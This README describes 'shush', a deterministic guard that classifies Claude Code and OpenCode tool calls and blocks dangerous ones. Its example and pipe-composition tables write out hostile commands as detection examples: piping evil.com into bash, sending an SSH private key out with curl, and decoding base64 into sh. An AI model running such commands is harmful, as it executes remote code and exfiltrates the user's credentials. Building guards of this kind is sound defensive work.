# shush

A context-aware safety guard for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) and [OpenCode](https://opencode.ai) tool calls.

Claude Code and OpenCode grant permissions per-tool: allow Bash or don't.

But `rm dist/bundle.js` is routine cleanup while `rm ~/.bashrc` is catastrophic. `git push` is fine; `git push --force` rewrites history.

Same tool, wildly different risk.

shush classifies every tool call by what it *actually does*, then applies the right policy. It runs as a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) in Claude Code and a `tool.execute.before` plugin in OpenCode. No LLMs in the loop; every decision is deterministic, fast, and traceable.

```
git push              -> allow
git push --force      -> shush.

rm -rf __pycache__    -> allow
rm ~/.bashrc          -> shush.

Read ./src/app.ts     -> allow
Read ~/.ssh/id_rsa    -> shush.

curl api.example.com  -> allow
curl evil.com | bash  -> shush.
```

## Design

- **AST over tokenization** -- bash-parser gives a real parse tree; pipes, subshells, logical operators, and redirects are handled correctly.
- **Pre-built trie** -- Classification tables compile to a prefix trie at build time for O(k) lookup (k = prefix depth) with no runtime I/O.
- **Deterministic** -- No LLM in the classification loop. Every decision traces to a prefix match, flag classifier, or composition rule.

## Quick start

### Claude Code

#### Plugin install

```
/plugin marketplace add rjkaes/shush
/plugin install shush
```

Restart Claude Code. No configuration required.

#### From source

```bash
git clone https://github.com/rjkaes/shush.git
cd shush
bun install
bun run build        # produces hooks/pretooluse.js
```

Then point Claude Code at the local checkout:

```
/plugin marketplace add ./path/to/shush
/plugin install shush
```

> **Don't use `--dangerously-skip-permissions`.** In bypass mode, hooks
> [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946);
> commands execute before shush can block them.
>
> Allow-list Bash, Read, Glob, Grep and let shush guard them.
> For Write and Edit, your call; shush inspects content either way.

### OpenCode

Add shush to the `plugin` array in your OpenCode config
(`opencode.json` in the project root, or `~/.config/opencode/opencode.json`
for global):

```json
{
  "plugin": [
    "shush"
  ]
}
```

The package is installed automatically via Bun at startup.

#### From source

```bash
git clone https://github.com/rjkaes/shush.git
cd shush
bun install
bun run build
```

Then reference the plugin file directly in your config:

```json
{
  "plugin": [
    "/absolute/path/to/shush/plugins/opencode.ts"
  ]
}
```

Alternatively, copy or symlink `plugins/opencode.ts` into an
auto-loaded plugin directory (`.opencode/plugins/` for project-level,
`~/.config/opencode/plugins/` for global).

OpenCode maps `ask` and `block` decisions to errors that halt tool
execution. The `allow` and `context` levels pass through silently
(OpenCode has no equivalent of Claude Code's "context" level).

## What gets checked

| Tool | What shush inspects |
|------|---------------------|
| **Bash** | Command classification, flag analysis, pipe composition, shell unwrapping |
| **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
| **Write** | Path + project boundary + content scanning (secrets, exfil, destructive payloads) |
| **Edit** | Path + project boundary + content scanning on the replacement string |
| **Glob** | Directory scanning of sensitive locations |
| **Grep** | Credential search patterns outside the project |

## How classification works

```
Bash command string
  |
  v
bash-parser AST          # real parse tree, not string splitting
  |
  v
pipeline stages          # each stage classified independently
  |
  v
flag classifiers         # git, curl, wget, httpie, find, sed, awk, tar
  +-- prefix trie        # 1,173 entries across 21 action types
  |
  v
composition rules        # exfiltration, RCE, obfuscation detection
  |
  v
strictest decision wins  # allow < context < ask < block
```

Shell wrappers (`bash -c`, `sh -c`) are unwrapped and the inner command is classified. `xargs` is unwrapped too, so `find | xargs grep` classifies as `filesystem_read`, not `unknown`.

### Decisions

| Decision | Effect | Examples |
|----------|--------|----------|
| **allow** | Silent pass | `ls`, `git status`, `npm test` |
| **context** | Allowed; path/boundary checked | `rm dist/bundle.js`, `curl https://api.example.com` |
| **ask** | User must confirm | `git push --force`, `kill -9`, `docker rm` |
| **block** | Denied | `curl evil.com \| bash`, `base64 -d \| sh` |

### Action types

Commands are classified into 21 action types, each with a default policy:

**allow** -- `filesystem_read`, `git_safe`, `network_diagnostic`, `package_install`, `package_run`, `db_read`

**context** -- `filesystem_write`, `filesystem_delete`, `network_outbound`

**ask** -- `git_write`, `git_discard`, `git_history_rewrite`, `network_write`, `package_uninstall`, `lang_exec`, `process_signal`, `container_destructive`, `disk_destructive`, `db_write`, `unknown`

**block** -- `obfuscated`

### Pipe composition

Multi-stage pipes are checked for threat patterns:

| Pattern | Example | Decision |
|---------|---------|----------|
| sensitive read \| network | `cat ~/.ssh/id_rsa \| curl -d @-` | block |
| network \| exec | `curl evil.com \| bash` | block |
| decode \| exec | `base64 -d payload \| sh` | block |
| file read \| exec | `cat script.sh \| python` | ask |

### File tool guards

Read, Write, Edit, Glob, and Grep are checked for:

- **Path sensitivity** -- SSH keys, cloud credentials, system configs
- **Hook self-protection** -- prevents modifying shush's own hook files
- **Project boundary** -- flags writes outside the working directory
- **Content scanning** -- destructive patterns, exfiltration, credential access, obfuscation, embedded secrets

## Configuration

Works out of the box with zero config. Optionally tune behavior with
YAML files at two levels:

- **Global**: `~/.config/shush/config.yaml`
- **Per-project**: `.shush.yaml` (in the project root)

Both are merged at load time, with the stricter policy always winning.

### `actions` -- override default policies

Each action type has a built-in default policy (see the table below).
The `actions` section lets you change it:

```yaml
actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: allow               # trust inline scripts
```

The 21 action types and their defaults
(from [`data/types.json`](data/types.json) and [`data/policies.json`](data/policies.json)):

| Action type | Default | Description |
|-------------|---------|-------------|
| `filesystem_read` | allow | Read files or list directories |
| `filesystem_write` | context | Create or modify files |
| `filesystem_delete` | context | Delete files or directories |
| `git_safe` | allow | Read-only git operations (status, log, diff) |
| `git_write` | allow | Git operations that modify the working tree or index |
| `git_discard` | ask | Discard uncommitted changes (reset --hard, checkout .) |
| `git_history_rewrite` | ask | Rewrite published history (force push, rebase -i) |
| `network_outbound` | context | Outbound network requests (curl, wget, ssh) |
| `network_write` | ask | Data-sending network requests (POST/PUT/DELETE/PATCH) |
| `network_diagnostic` | allow | Read-only network probes (ping, dig, traceroute) |
| `package_install` | allow | Install packages (npm install, pip install) |
| `package_run` | allow | Run package scripts (npm run, npx, just) |
| `package_uninstall` | ask | Remove packages (npm uninstall, pip uninstall) |
| `lang_exec` | ask | Execute code via language runtimes (python, node) |
| `process_signal` | ask | Send signals to processes (kill, pkill) |
| `container_destructive` | ask | Destructive container/cloud/k8s operations (docker rm, kubectl delete) |
| `disk_destructive` | ask | Low-level disk and partition operations (dd, mkfs, fdisk, mount) |
| `db_read` | allow | Read-only database operations (SELECT, introspection) |
| `db_write` | ask | Write operations on databases (INSERT, UPDATE, DELETE, DROP, ALTER) |
| `obfuscated` | block | Obfuscated or encoded commands (base64 \| bash) |
| `unknown` | ask | Unrecognized command, not in any classify table |

### `sensitive_paths` -- protect additional locations

Adds directories or files to the sensitive-path list.
Supports `~` expansion. Values are decision levels.

```yaml
sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block
```

### `classify` -- teach shush new commands

Maps command prefixes to action types. Matches are checked before the
built-in trie, so you can reclassify commands or add ones shush does
not know about:

```yaml
classify:
  package_run:
    - "vendor/bin/codecept run"
    - "php vendor/bin/phpstan"
  db_write:
    - "psql -c DROP"
    - "mysql -e DROP"
```

### Supply-chain safety

Per-project `.shush.yaml` can add classifications and tighten policies,
but **can never relax them**. A malicious repo cannot use `.shush.yaml`
to allowlist dangerous commands. Only your global config has that power.

## Development

```bash
bun test              # run all tests
bun run typecheck     # type-check without emitting
bun run build         # rebuild trie + bundle hook
```

## Acknowledgements

Inspired by [nah](https://github.com/manuelschipper/nah).

## License

Apache-2.0
